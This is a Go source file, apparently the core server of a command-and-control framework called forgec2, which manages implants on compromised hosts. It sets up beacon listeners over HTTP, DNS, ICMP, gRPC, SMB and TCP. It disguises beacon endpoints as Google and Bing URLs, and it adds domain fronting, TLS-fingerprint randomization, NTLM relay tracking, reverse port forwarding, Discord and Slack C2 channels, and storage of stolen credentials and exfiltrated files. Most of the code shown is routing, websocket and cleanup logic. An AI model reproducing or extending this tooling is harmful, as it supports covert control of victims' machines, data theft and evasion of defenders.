package server

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/fs"
	"log/slog"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/config"
	"github.com/forgec2/forgec2/internal/crypto"
	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/plugin"
	"github.com/forgec2/forgec2/internal/server/middleware"
	"github.com/forgec2/forgec2/internal/server/opsec"
	"github.com/forgec2/forgec2/pkg/protocol"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"github.com/prometheus/client_golang/prometheus"
	"gorm.io/gorm"
)

type Server struct {
	cfg            *config.Config
	db             *gorm.DB
	router         *gin.Engine
	wsClients      map[*websocket.Conn]*wsClientConn
	wsMutex        sync.RWMutex
	wsUpgrader     websocket.Upgrader
	rateLimiter    *middleware.RateLimiter
	apiRateLimiter *middleware.APIRateLimiter
	loginLockout   *loginLockoutTracker
	socksEngine    *socksRelayEngine
	startTime      time.Time

	dnsListener           *DNSBeaconListener
	icmpListener          *ICMPBeaconListener
	grpcListener          *GRPCListener
	smbLn                 net.Listener
	tcpLn                 net.Listener
	tcpProtoListener      *TCPProtoListener
	screenMonitorImplants map[string]time.Time
	screenMonitorMu       sync.Mutex

	// P0-3: rportfwd (reverse port forward)
	rportfwdListeners map[string]*rportfwdRelay
	rportfwdMu        sync.Mutex

	trafficLog  *trafficRing
	updateState updateCheckState

	// Domain fronting
	domainFrontDomains []string
	domainFrontMu      sync.Mutex
	domainFrontAuto    bool
	domainFrontStatus  map[string]*frontDomainState

	// WebSocket hub
	wsHub     *WebSocketHub
	wsHubOnce sync.Once

	// Event system
	eventManager *EventManager

	// Beacon cipher removed, use ECDH session encryption (cfg.Crypto.Key = "ecdh:")

	// ECDH session manager (nil = disabled / old XOR mode)
	sessionManager *crypto.SessionManager

	monitorCollector *MonitorCollector

	// Plugin marketplace
	marketplace *plugin.Marketplace

	// Plugin execution manager
	pluginManager *plugin.Manager

	// Circuit breaker for listener health
	circuitBreaker *CircuitBreaker

	// Optimizations
	configReloader *ConfigReloader
	backupManager  *BackupManager
	configPath     string
	ctx            context.Context
	ctxCancel      context.CancelFunc
	wg             sync.WaitGroup

	// Extra listeners started dynamically via the UI (create listener).
	// Each entry is keyed by "scheme://host:port".
	extraListeners   map[string]io.Closer
	extraListenersMu sync.Mutex

	metrics *MetricsCollector

	// GeoIP lookup concurrency limiter
	geoIPSem chan struct{}

	// Task result background worker pool: limits concurrent goroutines spawned
	// for callbacks, plugin hooks, and token processing to prevent OOM under load.
	taskWorkerSem chan struct{}

	// NTLM relay session tracking
	ntlmRelays *ntlmRelayStore

	// Bulk operation history ring buffer
	bulkHistory   []BulkResult
	bulkHistoryMu sync.Mutex

	// Per-agent task queue depth tracking (agentID → pending task count)
	agentPendingTasks   map[string]int
	agentPendingTasksMu sync.Mutex

	// Beacon deduplication: track recently processed beacon fingerprints
	beaconDedupMu    sync.Mutex
	beaconDedupCache map[string]time.Time

	// External C2 channels (WebSocket relay, Discord, Slack)
	extC2Channels   map[string]*extC2WSChannel
	extC2ChannelsMu sync.Mutex
	extC2TaskQueue  map[string][]extC2Task
	extC2TaskMu     sync.Mutex
	extC2Notify     map[string]chan struct{} // per-channel notification for push-based task delivery

	// Async build job tracking
	buildJobs   map[string]*BuildJob
	buildJobsMu sync.RWMutex

	// Embedded frontend static files (nil = API-only mode)
	staticFS fs.FS

	// Main HTTP server (for graceful shutdown)
	httpServer *http.Server

	// In-flight request tracker for graceful shutdown
	inFlight *middleware.InFlightTracker

	// Flapping suppression: track last status event time per agent
	agentStatusCooldown   map[string]time.Time
	agentStatusCooldownMu sync.Mutex

	// Pending TOTP setup state (between generate and enable)
	pendingTOTP   *pendingTOTPState
	pendingTOTPMu sync.Mutex

	// Reusable HTTP clients with connection pooling
	httpClient     *http.Client
	httpClientLong *http.Client

	// Cached automation rules
	automationRules   []AutomationRule
	automationRulesMu sync.RWMutex
	automationRulesAt time.Time

	// Nav stats cache
	navStatsCache   gin.H
	navStatsCacheAt time.Time
	navStatsCacheMu sync.RWMutex

	// SIEM webhook for security event forwarding
	siem *SIEMWebhook

	// TLS fingerprint randomization (JARM/JA3)
	tlsFingerprint *TLSFingerprintManager

	// Server-side task handler registry
	taskHandlerRegistry *TaskHandlerRegistry

	// Dynamic malleable C2 profile manager
	profileManager *ProfileManager

	// Subsystem containers (grouped fields for decomposition)
	transport *TransportManager
	agents    *AgentTracker

	// Password change rate limiter (userID → last change time)
	pwdChangeTimes   map[uint]time.Time
	pwdChangeTimesMu sync.Mutex

	// JARM/JA3 continuous validation
	jarmValidator *JARMValidator

	// OPSEC adaptive threat manager
	opsecAdaptive *opsec.AdaptiveManager

	// Transport obfuscation (DNS/ICMP)
	transportObfuscation *TransportObfuscationManager
}

// BulkResult tracks a batch command operation.
type BulkResult struct {
	ID        int       `json:"id"`
	Timestamp time.Time `json:"timestamp"`
	Command   string    `json:"command"`
	TaskType  string    `json:"task_type"`
	Created   int       `json:"tasks_created"`
	Skipped   int       `json:"skipped_locked"`
	Failed    int       `json:"failed"`
	Operator  string    `json:"operator"`
}

const maxBulkHistory = 50

func New(cfg *config.Config, database *gorm.DB) *Server {
	gin.SetMode(gin.ReleaseMode)

	if err := middleware.InitJWTSecret(cfg, ""); err != nil {
		slog.Error("Failed to initialize JWT secret", "err", err)
		os.Exit(1)
	}
	crypto.InitLootEncryption(cfg.Server.JWTSecret)
	crypto.InitExtC2Encryption(cfg.Server.JWTSecret)

	inFlight := middleware.NewInFlightTracker()

	r := gin.New()
	r.RedirectTrailingSlash = false
	r.Use(gin.Recovery())
	r.Use(inFlight.Middleware())
	r.Use(middleware.RequestID())
	r.Use(middleware.SecurityHeaders(cfg.Server.TLSEnabled))
	r.Use(middleware.NoCache())
	r.Use(middleware.ErrorHandler())

	s := &Server{
		cfg:                   cfg,
		db:                    database,
		router:                r,
		wsClients:             make(map[*websocket.Conn]*wsClientConn),
		loginLockout:          newLoginLockoutTracker(),
		socksEngine:           newSocksRelayEngine(),
		startTime:             time.Now(),
		screenMonitorImplants: make(map[string]time.Time),
		rportfwdListeners:     make(map[string]*rportfwdRelay),
		trafficLog:            newTrafficRing(),
		eventManager:          NewEventManager(database),
		extraListeners:        make(map[string]io.Closer),
		domainFrontStatus:     make(map[string]*frontDomainState),
		agentPendingTasks:     make(map[string]int),
		beaconDedupCache:      make(map[string]time.Time),
		agentStatusCooldown:   make(map[string]time.Time),
		ntlmRelays:            newNTLMRelayStore(),
		extC2Channels:         make(map[string]*extC2WSChannel),
		extC2TaskQueue:        make(map[string][]extC2Task),
		extC2Notify:           make(map[string]chan struct{}),
		buildJobs:             make(map[string]*BuildJob),
		geoIPSem:              make(chan struct{}, GeoIPSemaphoreSize),
		taskWorkerSem:         make(chan struct{}, TaskWorkerPoolSize),
		wsUpgrader: websocket.Upgrader{
			ReadBufferSize:  WSReadBufSize,
			WriteBufferSize: WSWriteBufSize,
			CheckOrigin: func(r *http.Request) bool {
				return allowedOrigin(cfg, r)
			},
		},
		httpClient: &http.Client{
			Timeout: HTTPClientShortTimeout,
			Transport: &http.Transport{
				MaxIdleConns:        HTTPMaxIdleConns,
				MaxIdleConnsPerHost: HTTPMaxIdleConnsPerHost,
				IdleConnTimeout:     HTTPIdleConnTimeout,
			},
		},
		httpClientLong: &http.Client{
			Timeout: HTTPClientLongTimeout,
			Transport: &http.Transport{
				MaxIdleConns:        10,
				MaxIdleConnsPerHost: 3,
				IdleConnTimeout:     HTTPIdleConnTimeout,
			},
		},
	}

	s.ctx, s.ctxCancel = context.WithCancel(context.Background())

	// Beacon dedup cache cleanup (bounded to prevent memory exhaustion)
	go func() {
		ticker := time.NewTicker(BeaconDedupCleanup)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				s.beaconDedupMu.Lock()
				now := time.Now()
				for k, t := range s.beaconDedupCache {
					if now.Sub(t) > BeaconDedupStaleAge {
						delete(s.beaconDedupCache, k)
					}
				}
				s.beaconDedupMu.Unlock()
			case <-s.ctx.Done():
				return
			}
		}
	}()

	s.inFlight = inFlight

	// Initialize rate limiters with context for graceful shutdown
	s.rateLimiter = middleware.NewRateLimiter(s.ctx, cfg.RateLimit.Beacon.Limit, time.Duration(cfg.RateLimit.Beacon.Window)*time.Second)
	s.apiRateLimiter = middleware.NewAPIRateLimiter(s.ctx, cfg.RateLimit.API.Capacity, cfg.RateLimit.API.Rate)

	// Start periodic cleanup for login lockout entries
	s.loginLockout.startCleanup(s.ctx)

	// Beacon payload encryption via ECDH session (cfg.Crypto.Key = "ecdh:")
	if strings.HasPrefix(cfg.Crypto.Key, "ecdh:") {
		maxMsgs := cfg.Crypto.SessionMaxMessages
		maxAgeMin := cfg.Crypto.SessionMaxAgeMinutes
		var maxAge time.Duration
		if maxAgeMin > 0 {
			maxAge = time.Duration(maxAgeMin) * time.Minute
		} else {
			maxAge = crypto.DefaultSessionMaxAge
		}
		sm, err := crypto.NewSessionManagerWithConfig(maxMsgs, maxAge)
		if err != nil {
			slog.Error("Failed to initialize ECDH session manager, falling back to XOR", "err", err)
		} else {
			s.sessionManager = sm
			slog.Info("ECDH session encryption enabled",
				"max_messages", sm.MaxMessages(),
				"max_age", sm.MaxAge())
		}
	}

	s.apiRateLimiter.SetWhitelist(cfg.RateLimit.API.Whitelist)

	s.metrics = NewMetricsCollector(s)
	s.metrics.Register(prometheus.DefaultRegisterer)
	r.Use(metricsMiddleware(s.metrics))

	if cfg.SIEM.Enabled && cfg.SIEM.URL != "" {
		s.siem = NewSIEMWebhook(cfg.SIEM.URL, cfg.SIEM.Token, cfg.SIEM.Actions)
		slog.Info("SIEM webhook enabled", "url", cfg.SIEM.URL)
	}

	// TLS fingerprint randomization (JARM/JA3)
	s.initTLSFingerprint()

	// Server-side task handler registry
	s.taskHandlerRegistry = NewTaskHandlerRegistry()

	// Dynamic malleable C2 profile manager
	s.profileManager = NewProfileManager()

	// Password change rate limiter
	s.pwdChangeTimes = make(map[uint]time.Time)

	// JARM/JA3 continuous validation
	s.jarmValidator = NewJARMValidator(s.cfg.TLSFingerprint.JARMEnabled)

	// OPSEC adaptive threat manager
	s.opsecAdaptive = opsec.NewAdaptiveManager()
	s.opsecAdaptive.StartDecayLoop()

	// Transport obfuscation (DNS/ICMP)
	s.transportObfuscation = NewTransportObfuscationManager()

	// NOTE: setupRoutes() is NOT called here. Call SetupRoutes() after
	// SetStaticFS() to ensure the static file middleware runs before route handlers.

	// Initialize plugin marketplace
	s.marketplace = plugin.NewMarketplace(database)
	s.marketplace.StartUpdateChecker(PluginUpdateCheckInterval)

	// Initialize plugin execution manager
	s.pluginManager = plugin.NewManager(database)
	s.pluginManager.SetMarketplace(s.marketplace)
	pluginDir := filepath.Join(s.cfg.Server.DataDir, "plugins")
	if err := os.MkdirAll(pluginDir, 0750); err != nil {
		slog.Warn("Failed to create plugin data directory", "dir", pluginDir, "err", err)
	}
	if err := s.pluginManager.LoadFromDisk(pluginDir); err != nil {
		slog.Warn("Failed to load plugins from data directory", "dir", pluginDir, "err", err)
	}
	if err := s.pluginManager.LoadFromDisk("plugins"); err != nil {
		slog.Warn("Failed to load bundled plugins", "dir", "plugins", "err", err)
	}

	// Register event handlers
	s.eventManager.On(EventImplantCheckin, func(evt Event) {
		s.dispatchEvent(evt, true)
	})
	s.eventManager.On(EventImplantDisconnect, func(evt Event) {
		s.dispatchEvent(evt, true)
	})
	s.eventManager.On(EventTaskComplete, func(evt Event) {
		s.dispatchEvent(evt, false)
	})
	s.eventManager.On(EventTaskFail, func(evt Event) {
		s.dispatchEvent(evt, false)
	})
	s.eventManager.On(EventCredentialFound, func(evt Event) {
		s.dispatchEvent(evt, true)
	})
	s.migrateAutomationRules()
	s.registerBuiltinAutomations()

	s.monitorCollector = NewMonitorCollector(s)
	s.monitorCollector.Start()

	s.loadScriptsFromDB()

	return s
}

// dispatchEvent dispatches webhooks, notifications, alerts, and automation rules for an event.
func (s *Server) dispatchEvent(evt Event, includeAlert bool) {
	s.triggerWebhooks(evt)
	s.triggerEmailNotifications(evt)
	if includeAlert {
		s.TriggerAlertForEvent(evt)
	}
	rules := s.loadAutomationRules()
	for _, rule := range rules {
		if rule.Enabled && rule.EventType == string(evt.Type) {
			s.evaluateRule(evt, rule)
		}
	}
}

func (s *Server) InitOptimizations(configPath string) {
	s.configPath = configPath
	s.configReloader = NewConfigReloader(s.cfg, configPath, func(cfg *config.Config) {
		slog.Info("Config reloaded, applying runtime changes")

		// Invalidate automation rule cache so next request fetches fresh rules
		s.automationRulesMu.Lock()
		s.automationRulesAt = time.Time{}
		s.automationRulesMu.Unlock()

		// Invalidate nav stats cache
		s.navStatsCacheMu.Lock()
		s.navStatsCacheAt = time.Time{}
		s.navStatsCacheMu.Unlock()

		slog.Info("Config reload applied successfully")
	})
	if err := s.configReloader.Start(); err != nil {
		slog.Warn("Failed to start config reloader", "error", err)
	}

	backupDir := filepath.Join(s.cfg.Server.DataDir, "backups")
	var backupKey string
	if s.cfg.Crypto.Key != "" {
		backupKey = s.cfg.Crypto.Key
	}

	var err error
	s.backupManager, err = NewBackupManager(s.db, s.cfg.Database.Path, backupDir, backupKey)
	if err != nil {
		slog.Warn("Failed to initialize backup manager", "error", err)
		return
	}

	if err := s.backupManager.Start("daily"); err != nil {
		slog.Warn("Failed to start backup manager", "error", err)
	}
}

func (s *Server) SetupRoutes() {
	// Request logging middleware
	s.router.Use(middleware.RequestLogger())

	// CORS middleware — applies to all routes
	s.router.Use(middleware.CORS(s.cfg.Server.AllowedOrigins))

	// Unauthenticated routes
	s.registerPublicRoutes()

	// Protected routes
	auth := s.router.Group("/")
	auth.Use(middleware.AuthRequired(s.db))
	auth.Use(middleware.CSRFProtect())
	auth.Use(middleware.RequestBodyLimit(MaxJSONBodySize))
	auth.Use(s.apiRateLimiter.LimitByUser())
	auth.Use(s.AuditMiddleware())
	auth.Use(s.ActivityMiddleware())
	{
		s.registerAgentRoutes(auth)
		s.registerAgentCommandRoutes(auth)
		s.registerAutomationRoutes(auth)
		s.registerPluginRoutes(auth)
		s.registerTaskRoutes(auth)
		s.registerCredentialRoutes(auth)
		s.registerGenerateRoutes(auth)
		s.registerListenerRoutes(auth)
		s.registerReconRoutes(auth)
		s.registerSettingsRoutes(auth)
		s.registerDebugRoutes(auth)
		s.registerUserRoutes(auth)
		s.registerCampaignRoutes(auth)
		s.registerIntegrationRoutes(auth)
		s.registerDNSRoutes(auth)
		s.registerExtendedRoutes(auth)
		s.registerAPIKeyRoutes(auth)
	}

	// Agent Beacon API (no auth — agents check in unauthenticated)
	beaconAPI := s.router.Group("/api/v1")
	beaconAPI.Use(s.rateLimiter.Limit())
	beaconAPI.Use(s.trafficMiddleware())
	{
		beaconAPI.POST("/beacon", s.handleBeacon)
		beaconAPI.POST("/screen_frame", s.handleScreenFrame)

		// Malleable profile support (similar to Cobalt Strike)
		beaconAPI.POST("/generate_204", s.handleBeacon)
		beaconAPI.POST("/th", s.handleBeacon)
		beaconAPI.GET("/generate_204", s.handleBeacon)
		beaconAPI.GET("/th", s.handleBeacon)
	}

	// Protected REST API (authentication required)
	restAPI := s.router.Group("/api/v1")
	restAPI.Use(middleware.AuthRequired(s.db))
	restAPI.Use(middleware.CSRFProtect())
	restAPI.Use(middleware.RequestBodyLimit(MaxJSONBodySize))
	restAPI.Use(s.apiRateLimiter.LimitByUser())
	{
		s.registerAPIRoutes(restAPI)
	}

	// Root-level malleable profile routes (agent beacon_uri does NOT include /api/v1/ prefix)
	s.router.POST("/generate_204", s.handleBeacon)
	s.router.GET("/generate_204", s.handleBeacon)

	// Catch-all for profile-defined beacon URIs (e.g. bing /th?id=...)
	s.router.GET("/th", s.handleBeacon)
	s.router.POST("/th", s.handleBeacon)
	if s.cfg.Malleable.Enabled {
		s.router.NoRoute(func(c *gin.Context) {
			if c.Request.Method == "POST" && c.GetHeader("Accept") != "application/json" {
				s.rateLimiter.Limit()(c)
				if c.IsAborted() {
					return
				}
				s.handleBeacon(c)
				return
			}
			respondError(c, http.StatusNotFound, "not found")
		})
	} else {
		s.router.NoRoute(func(c *gin.Context) {
			respondError(c, http.StatusNotFound, "not found")
		})
	}

	// External C2 (redirector-facing, no auth, rate-limited)
	extc2 := s.router.Group("/extc2/v1")
	extc2.Use(s.rateLimiter.Limit())
	{
		extc2.POST("/receive", s.handleExtC2Receive)
		extc2.POST("/send", s.handleExtC2Send)
	}

	// Post-group authenticated routes
	s.registerMonitorRoutes(auth)
	s.registerDashboardCharts(auth)
	s.registerBOFRoutes(auth)
	s.registerMiscRoutes(auth)
}



// handleWebSocket handles WebSocket connections for real-time notifications
// Auth is validated inside the handler (from cookie or query token) so this
// endpoint does NOT need to be behind the AuthRequired middleware.
func (s *Server) handleWebSocket(c *gin.Context) {
	origin := c.GetHeader("Origin")
	if origin != "" && !s.wsUpgrader.CheckOrigin(c.Request) {
		c.AbortWithStatusJSON(http.StatusForbidden, gin.H{"success": false, "error": "origin not allowed"})
		return
	}

	tokenStr, err := c.Cookie("forgec2_session")
	if err != nil || tokenStr == "" {
		c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"success": false, "error": "no session token"})
		return
	}
	claims, err := middleware.ParseToken(tokenStr)
	if err != nil {
		c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"success": false, "error": "invalid token"})
		return
	}
	username := claims.Username

	conn, err := s.wsUpgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		slog.Error("Failed to upgrade WebSocket", "err", err)
		return
	}

	conn.SetReadDeadline(time.Now().Add(WSReadDeadline))
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(WSReadDeadline))
		return nil
	})

	session := UserSession{Username: username, ConnectedAt: time.Now()}
	client := &wsClientConn{
		conn:    conn,
		session: session,
		ch:      make(chan []byte, wsWriteChanSize),
		done:    make(chan struct{}),
	}

	s.wsMutex.Lock()
	if len(s.wsClients) >= MaxWSConnections {
		s.wsMutex.Unlock()
		slog.Warn("WebSocket connection limit reached", "current", len(s.wsClients), "limit", MaxWSConnections)
		conn.Close()
		return
	}
	s.wsClients[conn] = client
	s.wsMutex.Unlock()

	// Writer goroutine: drains the buffered channel and writes to the socket.
	go func() {
		defer func() {
			close(client.done)
		}()
		ticker := time.NewTicker(WSPingInterval)
		defer ticker.Stop()
		for {
			select {
			case <-s.ctx.Done():
				return
			case msg, ok := <-client.ch:
				if !ok {
					return
				}
				conn.SetWriteDeadline(time.Now().Add(WSWriteDeadline))
				if err := conn.WriteMessage(websocket.TextMessage, msg); err != nil {
					slog.Debug("Failed to send WebSocket message", "user", username, "err", err)
					return
				}
			case <-ticker.C:
				conn.SetWriteDeadline(time.Now().Add(WSWriteDeadline))
				if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
					return
				}
			}
		}
	}()

	slog.Info("WebSocket client connected", "user", username)
	s.broadcastUserEvent("user_online", username, session)

	go func() {
		defer func() {
			if r := recover(); r != nil {
				slog.Error("WebSocket reader panicked", "user", username, "recover", r)
			}
			s.wsMutex.Lock()
			delete(s.wsClients, conn)
			s.wsMutex.Unlock()
			close(client.ch)
			s.broadcastUserEvent("user_offline", username, session)
			conn.Close()
			slog.Info("WebSocket client disconnected", "user", username)
		}()

		for {
			conn.SetReadDeadline(time.Now().Add(WSReadDeadline))
			_, _, err := conn.ReadMessage()
			if err != nil {
				return
			}
		}
	}()
}

// UserSession holds metadata about a connected operator WebSocket session.
type UserSession struct {
	Username    string    `json:"username"`
	ConnectedAt time.Time `json:"connected_at"`
}

// wsClientConn wraps a WebSocket connection with a buffered write channel
// so that broadcastToClients never blocks on slow readers.
type wsClientConn struct {
	conn    *websocket.Conn
	session UserSession
	ch      chan []byte
	done    chan struct{}
}

const wsWriteChanSize = 64

// getOnlineUsers returns the list of currently connected operator sessions.
func (s *Server) getOnlineUsers() []UserSession {
	s.wsMutex.RLock()
	defer s.wsMutex.RUnlock()
	users := make([]UserSession, 0, len(s.wsClients))
	seen := make(map[string]bool)
	for _, client := range s.wsClients {
		if !seen[client.session.Username] {
			seen[client.session.Username] = true
			users = append(users, client.session)
		}
	}
	return users
}

// broadcastUserEvent sends a user online/offline event to all WebSocket clients.
func (s *Server) broadcastUserEvent(eventType, username string, session UserSession) {
	msg, ok := marshalJSONSafe(map[string]interface{}{
		"type":         eventType,
		"username":     username,
		"connected_at": session.ConnectedAt,
		"online_users": s.getOnlineUsers(),
	})
	if !ok {
		return
	}
	s.broadcastToClients(msg)
}

// broadcastToClients sends a message to all connected WebSocket clients.
// Uses buffered channels so the caller never blocks on slow readers.
func (s *Server) broadcastToClients(message []byte) {
	s.wsMutex.RLock()
	clients := make([]*wsClientConn, 0, len(s.wsClients))
	for _, client := range s.wsClients {
		clients = append(clients, client)
	}
	s.wsMutex.RUnlock()

	for _, client := range clients {
		select {
		case <-s.ctx.Done():
			return
		case client.ch <- message:
		default:
			slog.Debug("WebSocket write channel full, dropping message", "user", client.session.Username)
		}
	}
}

// broadcastAgentOnline pushes agent online events to all WebSocket clients.
func (s *Server) broadcastAgentOnline(agent db.Implant, isNew bool) {
	if !isNew && !s.suppressAgentStatusEvent(agent.ID) {
		return
	}
	payload := map[string]interface{}{
		"type":     "agent_online",
		"agent_id": agent.ID,
		"hostname": agent.Hostname,
		"username": agent.Username,
		"ip":       agent.IP,
		"new":      isNew,
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal agent online notification", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

// broadcastAgentOffline pushes agent offline events to all WebSocket clients.
func (s *Server) broadcastAgentOffline(agent db.Implant) {
	if !s.suppressAgentStatusEvent(agent.ID) {
		return
	}
	payload := map[string]string{
		"type":     "agent_offline",
		"agent_id": agent.ID,
		"hostname": agent.Hostname,
		"ip":       agent.IP,
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal agent offline notification", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

// suppressAgentStatusEvent ensures at most one status event per agent every 60 seconds.
// Returns true if the event should proceed, false if it should be suppressed.
func (s *Server) suppressAgentStatusEvent(agentID string) bool {
	s.agentStatusCooldownMu.Lock()
	defer s.agentStatusCooldownMu.Unlock()
	last, ok := s.agentStatusCooldown[agentID]
	now := time.Now()
	if ok && now.Sub(last) < 60*time.Second {
		return false
	}
	s.agentStatusCooldown[agentID] = now
	return true
}

func (s *Server) handleWSBeaconDisconnect(agentID string) {
	slog.Info("WebSocket beacon disconnected", "agent_id", agentID)
	var agent db.Implant
	if err := s.db.Where("id = ?", agentID).First(&agent).Error; err != nil {
		return
	}
	if agent.Status != "offline" {
		s.db.Model(&agent).Update("status", "stale")
		s.recordAgentStatusEvent(agentID, "stale")
		if s.suppressAgentStatusEvent(agentID) {
			s.broadcastAgentOffline(agent)
		}
	}
}

// broadcastAgentDataUpdate pushes agent data changes to all WebSocket clients.
func (s *Server) broadcastAgentDataUpdate(agentID string, data map[string]interface{}) {
	payload := map[string]interface{}{
		"type":     "agent_data_update",
		"agent_id": agentID,
		"data":     data,
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal agent data update", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

// broadcastTaskUpdate pushes task status (and result if completed) to WS clients
func (s *Server) broadcastTaskUpdate(agentID string, task db.Task) {
	payload := map[string]interface{}{
		"type":       "task_update",
		"agent_id":   agentID,
		"task_id":    task.ID,
		"task_type":  task.Type,
		"status":     task.Status,
		"command":    task.Command,
		"created_by": task.CreatedBy,
	}
	if task.Result != "" {
		payload["result"] = truncateString(task.Result, 200)
	}
	if task.Error != "" {
		payload["error"] = task.Error
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal task update", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

func truncateString(s string, max int) string {
	if len(s) > max {
		return s[:max] + "..."
	}
	return s
}

func (s *Server) pushBulkResult(r BulkResult) {
	s.bulkHistoryMu.Lock()
	defer s.bulkHistoryMu.Unlock()
	if len(s.bulkHistory) >= maxBulkHistory {
		s.bulkHistory = s.bulkHistory[1:]
	}
	r.ID = len(s.bulkHistory) + 1
	s.bulkHistory = append(s.bulkHistory, r)
}

// cleanupOldData removes old completed/failed tasks and old files (screenshots + uploads) to prevent bloat
func (s *Server) cleanupOldData() {
	retention := s.cfg.Server.CleanupRetentionDays
	if retention < 1 {
		retention = DefaultCleanupRetentionDays
	}
	cutoff := time.Now().AddDate(0, 0, -retention)

	// delete old tasks
	if err := s.db.Where("created_at < ? AND status IN ?", cutoff, []string{"completed", "failed"}).Delete(&db.Task{}).Error; err != nil {
		slog.Error("Cleanup tasks failed", "err", err)
	}

	// Periodic SQLite maintenance: VACUUM and ANALYZE to prevent bloat and
	// keep query planner statistics fresh. Only runs if the DB is SQLite.
	if sqlDB, err := s.db.DB(); err == nil {
		if err := sqlDB.Ping(); err == nil {
			dbName := s.cfg.Database.Driver
			if dbName == "" || dbName == "sqlite" {
				go func() {
					if _, err := sqlDB.Exec("PRAGMA optimize"); err != nil {
						slog.Debug("SQLite ANALYZE failed", "err", err)
					}
				}()
			}
		}
	}

	s.cleanupGhostAgents()

	dataDir := s.cfg.Server.DataDir
	if dataDir == "" {
		dataDir = "data"
	}

	// Clean old screenshots
	s.cleanOldFiles(filepath.Join(dataDir, "screenshots"), cutoff)

	// Clean old uploads (exfil files)
	s.cleanOldFiles(filepath.Join(dataDir, "uploads"), cutoff)

	// Clean old agent binaries
	s.cleanOldFiles(filepath.Join(dataDir, "agents"), cutoff)

	s.cleanupStaleMapEntries()

	slog.Info("Old data cleanup completed")
}

func (s *Server) cleanupStaleMapEntries() {
	cutoff := time.Now().Add(-StaleMapCleanupAge)
	cleaned := 0

	// Clean stale agentStatusCooldown entries
	s.agentStatusCooldownMu.Lock()
	for k, v := range s.agentStatusCooldown {
		if v.Before(cutoff) {
			delete(s.agentStatusCooldown, k)
			cleaned++
		}
	}
	s.agentStatusCooldownMu.Unlock()

	// Clean stale screenMonitorImplants entries
	s.screenMonitorMu.Lock()
	for k, v := range s.screenMonitorImplants {
		if v.Before(cutoff) {
			delete(s.screenMonitorImplants, k)
			cleaned++
		}
	}
	s.screenMonitorMu.Unlock()

	// Clean empty extC2TaskQueue entries
	s.extC2TaskMu.Lock()
	for k, v := range s.extC2TaskQueue {
		if len(v) == 0 {
			delete(s.extC2TaskQueue, k)
			cleaned++
		}
	}
	s.extC2TaskMu.Unlock()

	if cleaned > 0 {
		slog.Info("Cleaned stale map entries", "count", cleaned)
	}
}

func (s *Server) offlineThreshold() time.Duration {
	d := s.cfg.Server.OfflineThreshold
	if d < 1 {
		d = DefaultOfflineThresholdSec
	}
	return time.Duration(d) * time.Second
}

func (s *Server) staleThreshold() time.Duration {
	return s.offlineThreshold() * StaleThresholdMultiplier
}

// AgentStatusInfo holds display info for an agent's status
type AgentStatusInfo struct {
	Status    string // "online", "stale", "offline"
	Label     string // "Online", "Timeout", "Offline"
	DotColor  string // tailwind bg class
	BgColor   string // tailwind bg class
	TextColor string // tailwind text class
	Anim      string // animate-pulse or empty
}

func (s *Server) agentStatus(a db.Implant) AgentStatusInfo {
	since := time.Since(a.LastSeen)
	threshold := s.offlineThreshold()
	switch {
	case since < threshold:
		return AgentStatusInfo{"online", "Online", "bg-emerald-500", "bg-emerald-50", "text-emerald-700", "animate-pulse"}
	case since < s.staleThreshold():
		return AgentStatusInfo{"stale", "Timeout", "bg-amber-500", "bg-amber-50", "text-amber-700", ""}
	default:
		return AgentStatusInfo{"offline", "Offline", "bg-red-500", "bg-red-50", "text-red-700", ""}
	}
}

// cleanupGhostAgents removes invalid or long-dead implant records.
func (s *Server) cleanupGhostAgents() {
	ghostCutoff := time.Now().Add(-GhostAgentCutoff)
	var ghosts []db.Implant
	if err := s.db.Where("(hostname = '' OR hostname IS NULL) AND (ip = '' OR ip IS NULL) AND last_seen < ?", ghostCutoff).Limit(500).Find(&ghosts).Error; err != nil {
		return
	}
	if len(ghosts) > 0 {
		ghostIDs := make([]string, len(ghosts))
		for i, a := range ghosts {
			ghostIDs[i] = a.ID
		}
		if err := s.db.Transaction(func(tx *gorm.DB) error {
			if err := tx.Where("agent_id IN ?", ghostIDs).Delete(&db.Task{}).Error; err != nil {
				return err
			}
			return tx.Where("id IN ?", ghostIDs).Delete(&db.Implant{}).Error
		}); err != nil {
			slog.Error("Failed to remove ghost agents", "err", err)
		} else {
			slog.Info("Removed ghost agents", "count", len(ghosts))
		}
	}

	retention := s.cfg.Server.CleanupRetentionDays
	if retention < 1 {
		retention = DefaultCleanupRetentionDays
	}
	offlineCutoff := time.Now().AddDate(0, 0, -retention)
	var stale []db.Implant
	if err := s.db.Where("last_seen < ?", offlineCutoff).Limit(500).Find(&stale).Error; err != nil {
		return
	}
	if len(stale) > 0 {
		idStrs := make([]string, len(stale))
		for i, a := range stale {
			idStrs[i] = a.ID
		}
		slog.Info("Removing stale offline agents", "count", len(stale), "age_days", retention)
		if err := s.db.Transaction(func(tx *gorm.DB) error {
			if err := tx.Where("agent_id IN ?", idStrs).Delete(&db.Task{}).Error; err != nil {
				return err
			}
			return tx.Where("id IN ?", idStrs).Delete(&db.Implant{}).Error
		}); err != nil {
			slog.Error("Failed to remove stale agents", "err", err)
		}
	}
}

// cleanOldFiles recursively removes files older than cutoff in the given dir
func (s *Server) cleanOldFiles(dir string, cutoff time.Time) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	for _, e := range entries {
